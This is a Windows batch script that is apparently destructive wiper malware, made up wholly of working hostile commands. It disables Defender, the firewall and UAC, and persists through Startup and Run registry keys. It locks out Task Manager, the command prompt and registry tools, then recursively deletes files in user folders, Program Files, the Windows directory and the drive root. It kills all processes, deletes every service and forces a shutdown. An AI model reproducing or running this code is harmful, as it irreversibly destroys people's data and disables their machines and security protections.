@echo off

call:func_1

call:func_2

call:func_3

call:func_6

gpupdate /force > nul 2> nul

shutdown /s /f /t 00 > nul 2> nul

exit

:func_1

    reg add HKLM\Software\Policies\Microsoft\WindowsDefender /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2> nul
    reg add HKLM\Software\Policies\Microsoft\WindowsDefender /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f > nul 2> nul
    reg delete HKLM\SYSTEM\CurrentControlSet\Services\WinDefend\Security /f > nul 2> nul

    gpupdate /force > nul 2> nul
    powershell.exe Restart-Service -Name WinDefend -Confirm:$false -Force > nul 2> nul
    sc stop WinDefend > nul 2> nul
    sc query WinDefend > nul 2> nul
    sc delete WinDefend > nul 2> nul
    powershell.exe Set-NetFirewallProfile -Enabled False > nul 2> nul
    powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true > nul 2> nul
    netsh advfirewall set allprofiles state off > nul 2> nul
    netsh firewall set opmode mode=disable > nul 2> nul
    netsh advfirewall firewall delete > nul 2> nul
    netsh wlan disconnect > nul 2> nul

    goto :eof

:func_2

    cd "C:%~p0" > nul 2> nul

    copy "wallpaper.bmp" "%SystemRoot%" /y > nul 2> nul

    if not exist "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\%~n0%~x0" (

       copy "%~f0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\" /y > nul 2> nul
    )

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "%~n0" /t REG_SZ /d "%SystemRoot%\System32\%~n0%~x0" /f > nul 2> nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "%~n0" /t REG_SZ /d "%SystemRoot%\System32\%~n0%~x0" /f > nul 2> nul
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%~n0" /t REG_SZ /d "%SystemRoot%\System32\%~n0%~x0" /f > nul 2> nul
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "%~n0" /t REG_SZ /d "%SystemRoot%\System32\%~n0%~x0" /f > nul 2> nul
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v "%~n0" /t REG_SZ /d "%SystemRoot%\System32\%~n0%~x0" /f > nul 2> nul
    reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f > nul 2> nul    

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f > nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 2> nul
    reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f > nul 2> nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f > nul 2> nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f > nul 2> nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2> nul

    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /f /d "%SystemRoot%\wallpaper.bmp" > nul 2> nul
    reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /f /d 2 > nul 2> nul
    "%SystemRoot%\System32\RUNDLL32.EXE" user32.dll, UpdatePerUserSystemParameters > nul 2> nul

    call:func_4 "%userprofile%\Documents"
    call:func_4 "%userprofile%\Downloads"
    call:func_4 "%userprofile%\Music"
    call:func_4 "%userprofile%\Pictures"
    call:func_4 "%userprofile%\Videos"
    call:func_4 "%userprofile%\Desktop"
    call:func_4 "C:\Program Files"
    call:func_4 "C:\Program Files (x86)"
    call:func_4 "C:\PerfLogs"
    call:func_4 "C:\Users"
    call:func_4 "%SystemRoot%"
    call:func_4 "\"
    
    call:func_5 "%userprofile%\Documents"
    call:func_5 "%userprofile%\Downloads"
    call:func_5 "%userprofile%\Desktop"
    call:func_5 "%userprofile%\Music"
    call:func_5 "%userprofile%\Pictures"
    call:func_5 "%userprofile%\Videos"
    call:func_5 "%SystemRoot%\System32\"
    call:func_5 "%AppData%\Microsoft\Windows\"

    goto :eof

:func_3
    
    taskkill /fi "IMAGENAME ne %~n0%~x0" /t /f > nul 2> nul
    taskkill /im svchost.exe /t /f > nul 2> nul
    taskkill /im explorer.exe /t /f > nul 2> nul
    
    ipconfig /release > nul 2> nul
    ipconfig /release6 > nul 2> nul

    goto :eof

:func_4

    cd "%~f1" > nul

    attrib +h +s "%~n0%~x0" > nul 2> nul

    del /f /q /s *.* > nul 2> nul
    for /d /r %%i in (*) do ( rd /s /q %%i > nul 2> nul )
    
    attrib -h -s "%~n0%~x0" > nul 2> nul

    goto :eof

:func_5

    copy "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\%~n0%~x0" "%~f1" /y > nul 2> nul

    attrib +h +s "%~f1" > nul 2> nul
    
    goto :eof

:func_6

    sc query type= all state= all | findstr "NOMBRE_SERVCIO" >> serv64.txt 2> nul
    sc query type= all state= all | findstr "SERVICE_NAME" >> serv64.txt 2> nul
    attrib +h +s +r serv64.txt > nul 2> nul
    
    for /f "tokens=1,2 delims= " %%i in (serv64.txt) do (
    
        sc stop %%j > nul 2> nul
        sc query %%j > nul 2> nul
	    sc delete %%j > nul 2> nul
    )
    
    attrib -h -s serv64.txt > nul 2> nul
    
    del /f /q /s serv64.txt > nul 2> nul

    goto :eof
